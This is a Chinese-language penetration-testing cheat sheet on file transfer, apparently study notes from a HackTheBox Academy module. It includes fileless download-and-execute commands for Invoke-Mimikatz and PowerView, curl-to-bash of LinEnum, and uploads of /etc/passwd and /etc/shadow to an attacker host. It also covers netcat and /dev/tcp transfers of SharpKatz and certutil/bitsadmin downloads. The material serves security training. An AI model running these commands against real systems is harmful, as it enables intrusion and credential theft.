@@ -1,0 +1,398 @@
+# 文件传输
+
+## 一、Windows 文件传输
+
+> [必看原文](https://academy.hackthebox.com/module/24/section/160) 短一截
+
+### 1. Powershell Base64 编码和解码
+
+```shell
+# 在传输文件后，我们需要检查文件上传是否正确, 我们可以使用 MD5 查看
+md5sum id_rsa
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+
+# 将文件进行编码后传输
+cat id_rsa |base64 -w 0;echo
+[IO.File]::WriteAllBytes("Target Location", [Convert]::FromBase64String("BASE64 String"))
+```
+
+### 2. Powershell 网络下载
+
+> * [Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
+> * [IEX](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2)
+> * [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)
+> * [Powershell 下载命令详细列表](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
+
+```shell
+# 文件下载
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+ (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
+ 
+# 无文件方法
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+# 文件下载
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+```
+
+### 3. SMB 下载
+
+```shell
+# 使用 Impacket 中的smbserver.py 创建 SMB 服务器
+sudo impacket-smbserver share -smb2support /tmp -user test -password test
+
+# 从 SMB 服务器复制文件
+copy \\192.168.220.133\share\nc.exe
+# 使用用户名和密码挂载 SMB 服务器
+net use n: \\192.168.220.133\share /user:test test
+```
+
+### 4. FTP 下载
+
+```shell
+# 使用 Python3  pyftpdlib模块 创建 FTP 服务器
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+
+# 使用 Powershell 下载
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
+# 使用 FTP 客户端下载
+```
+
+### 5. Powershell 上传
+
+```shell
+# 第一种方法，设置上传服务器，然后在目标机执行上传命令
+# 配置 uploadserver 
+pip3 install uploadserver
+python3 -m uploadserver
+
+# 使用 Powershell 上传文件到服务器上
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+# 第二种方法： 使用网页上传，在本机监听
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+
+ nc -lvnp 8000
+```
+
+### 6. SMB 上传
+
+> 企业中通常不会让 SMB 协议离开其内部网络，这时候我们可以使用 WebDav , WebDav 是 HTTP 的扩展，HTTP 是 Web 浏览器和 Web 服务器用来相互通信的 Internet 协议。该`WebDAV`协议使网络服务器能够像文件服务器一样运行，支持协作内容创作。`WebDAV`也可以使用 HTTPS。
+>
+> 当您使用`SMB`时，它将首先尝试使用 SMB 协议进行连接，如果没有可用的 SMB 共享，它将尝试使用 HTTP 进行连接。
+
+```shell
+# 配置 WebDAV 服务器，需要安装 wsgidav、cheroot
+sudo pip install wsgidav cheroo
+# 使用 WebDav Python 模块
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+
+# 连接到 WebDAV 共享
+dir \\192.168.49.128\DavWWWRoot
+# 上传文件
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+
+`注意： DavWWWRoot是 Windows Shell 识别的特殊关键字。您的 WebDAV 服务器上不存在这样的文件夹。DavWWWRoot 关键字告诉 Mini-Redirector 驱动程序，该驱动程序处理您连接到 WebDAV 服务器根目录的 WebDAV 请求。如果您在连接到服务器时指定服务器上存在的文件夹，则可以避免使用此关键字。例如：\192.168.49.128\sharefolder`
+
+### 7. FTP 上传
+
+```shell
+# 设置 FTP 服务器
+# --write允许客户端将文件上传到我们的攻击主机
+sudo python3 -m pyftpdlib --port 21 --write
+
+# Powershell 上传
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+## 二、Linux 文件传输
+
+### 1. Base64 编码解码
+
+```shell
+# 检查哈希
+md5sum id_rsa
+cat id_rsa |base64 -w 0;echo
+echo -n 'Base64字符串' | base64 -d > id_rsa
+```
+
+### 2. Wget & CURL 进行 WEB 下载
+
+```shell
+# wget 下载文件
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+# CURL 下载文件
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+### 3. Linux 的无文件攻击
+
+```shell
+# 使用 CURl
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+# 使用 wget
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+### 4. 使用 Bash (/dev/tcp) 下载
+
+```shell
+# 连接到目标 WEB 服务器
+exec 3<>/dev/tcp/10.10.10.32/80
+# HTTP  GET  请求
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+# 打印响应
+cat <&3
+```
+
+### 5. SSH 下载
+
+> 详见 SSH 服务篇 --> 跳转链接
+
+### 6. 网页上传
+
+```shell
+# 创建自签名证书
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+# 启动 WEB 服务器
+python3 -m uploadserver 443 --server-certificate /root/server.pem
+
+# 上传多个文件
+# --insecure 是因为我们使用了我们信任的自签名证书
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+### 7. 各种 WEB 服务器
+
+```shell
+# Python3
+python3 -m http.server
+# Python2.7
+python2.7 -m SimpleHTTPServer
+# PHP 创建 Web 服务器
+php -S 0.0.0.0:8000
+# Ruby 创建 Web 服务器
+ruby -run -ehttpd . -p8000
+```
+
+### 8. SCP
+
+> 详见 SSH 服务篇 --> 网页跳转
+
+## 三、使用代码传输文件
+
+### 1. 下载
+
+```shell
+# Python2
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+# Python3
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+# PHP 使用 File_get_contents() 下载 
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+# Ruby
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+
+# Perl
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+
+# JavaScript
+# 创建 wget.js 文件 内容如下：
+    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+    WinHttpReq.Send();
+    BinStream = new ActiveXObject("ADODB.Stream");
+    BinStream.Type = 1;
+    BinStream.Open();
+    BinStream.Write(WinHttpReq.ResponseBody);
+    BinStream.SaveToFile(WScript.Arguments(1));
+# 使用 JavaScript 和 cscript.exe 下载文件
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+# VBScript
+# 创建 wget.vbs 文件 内容如下
+    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+    dim bStrm: Set bStrm = createobject("Adodb.Stream")
+    xHttp.Open "GET", WScript.Arguments.Item(0), False
+    xHttp.Send
+
+    with bStrm
+        .type = 1
+        .open
+        .write xHttp.responseBody
+        .savetofile WScript.Arguments.Item(1), 2
+    end with
+# 使用 JavaScript 和 cscript.exe 下载文件
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+### 2. 上传
+
+```shell
+# 启动 Python 上传服务器模块
+python3 -m uploadserver 
+ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+## 四、其他文件传输方法
+
+### 1. Netcat
+
+> * [Netcat](https://sectools.org/tool/netcat/)（通常缩写为`nc`）是一种计算机网络实用程序，用于使用 TCP 或 UDP 读取和写入网络连接
+
+1.  攻击主机连接目标主机
+
+    ```shell
+    # 目标主机
+    netcat -l -p 8000 > SharpKatz.exe
+    # 攻击主机
+    netcat -q 0 192.168.49.128 8000 < SharpKatz.exe
+
+
+    # 目标主机
+    ncat -l -p 8000 --recv-only > SharpKatz.exe
+    # 攻击主机
+    ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+    ```
+2.  目标主机连接攻击主机
+
+    ```shell
+    # 攻击主机--将文件作为输入发送到 Netcat
+    sudo nc -l -p 443 -q 0 < SharpKatz.exe
+    # 目标主机
+    nc 192.168.49.128 443 > SharpKatz.exe
+
+    # 攻击主机 - 将文件作为输入发送到 Ncat
+    sudo ncat -l -p 443 --send-only < SharpKatz.exe
+    # 受感染机器连接到 Ncat 以接收文件
+    ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+    ```
+3.  如果目标主机没有 Netcat 和 Ncat 我们可以使用 /dev/TCP 进行传输
+
+    ```shell
+    # 攻击主机--将文件作为输入发送到 Netcat
+    sudo nc -l -p 443 -q 0 < SharpKatz.exe
+    sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+    # 接收文件
+    cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+    ```
+
+### 2. Powershell 会话文件传输
+
+> * 我们可以使用 Powershell Remoting （又称 WinRM） 来执行文件传输操作
+> * Powershell Remoting 允许我们使用 Powershell 会话在远程计算机上执行脚本或命令。默认情况下，启用 PowerShell 远程处理会同时创建 HTTP 和 HTTPS 侦听器。侦听器在 HTTP 的默认端口 TCP/5985 和 HTTPS 的 TCP/5986 上运行。
+
+```shell
+#  需要管理员权限
+# 确认 WinRM 端口 TCP 5985 在 DATABASE01 上打开
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+# 创建到 DATABASE01 的 PowerShell 的远程会话
+$Session = New-PSSession -ComputerName DATABASE01
+
+# 将 samplefile.txt 从我们的本地主机复制到 DATABASE01 会话
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+# 将 DATABASE.txt 从 DATABASE01 Session 复制到我们的 Localhost
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### 3. RDP
+
+```shell
+# 使用 rdesktop 挂载 Linux 文件夹
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+# 使用 xfreerdp 挂载 Linux 文件夹
+ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+
+## 五、受保护的文件传输
+
+### 1. Windows 文件加密
+
+> 使用 [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1) PowerShell 脚本
+
+```shell
+# 导入模块调用
+Import-Module .\Invoke-AESEncryption.ps1
+# 文件加密示例
+Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+```
+
+### 2. Linux 文件加密
+
+```shell
+# 使用 openssl 加密 /etc/passwd
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# 使用 openssl 解密 passwd.enc
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd     
+```
+
+## 六、通过 HTTP/S 捕获文件
+
+### 1. Nginx
+
+```shell
+# 创建一个目录来处理上传的文件
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+# 将所有者更改为 www-data
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+# 创建 Nginx 配置文件  /etc/nginx/sites-available/upload.conf
+    server {
+        listen 9001;
+
+        location /SecretUploadDirectory/ {
+            root    /var/www/uploads;
+            dav_methods PUT;
+        }
+    }
+# 将我们的站点符号链接到启用站点的目录
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+# 启动 Nginx
+sudo systemctl restart nginx.service
+# 使用 CURL 上传文件
+curl -T /etc/passwd 
+http://localhost:9001/SecretUploadDirectory/users.txt
+```
+
+## 七、依赖本地
+
+> [Windows 二进制文件的 LOLBAS 项目](https://lolbas-project.github.io/) [适用于 Linux 二进制文件的 GTFOBins](https://gtfobins.github.io/)
+
+### 1. Bitsadmin 下载功能
+
+> 后台智能传输服务 (BITS)可用于从 HTTP 站点和 SMB 共享下载文件。它“智能地”检查主机和网络利用率，以尽量减少对用户前台工作的影响。
+
+```shell
+# 使用 Bitsadmin 下载文件
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
+
+# 下载
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
+# 上传
+Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
+```
+
+### 2. Certutil
+
+> Certutil 可用于下载任意文件。它适用于所有 Windows 版本，并且一直是一种流行的文件传输技术
+
+```shell
+# 使用 Certutil 下载文件
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+```
